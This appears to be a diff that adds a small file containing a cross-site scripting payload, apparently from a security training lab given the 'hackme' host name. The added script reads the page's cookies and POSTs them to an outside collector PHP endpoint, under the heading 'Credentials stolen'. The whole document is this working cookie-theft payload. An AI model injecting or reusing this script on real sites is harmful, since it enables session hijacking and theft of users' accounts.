@@ -1,0 +1,9 @@
+Credentials stolen
+<script>
+console.log("I am alive!");
+console.log(document.cookie);
+const ajax = new XMLHttpRequest();
+ajax.open("POST", "http://secfarm-107/hackme/xss_server/collector.php", true);
+ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajax.send(document.cookie.replace(";","&"));
+</script>
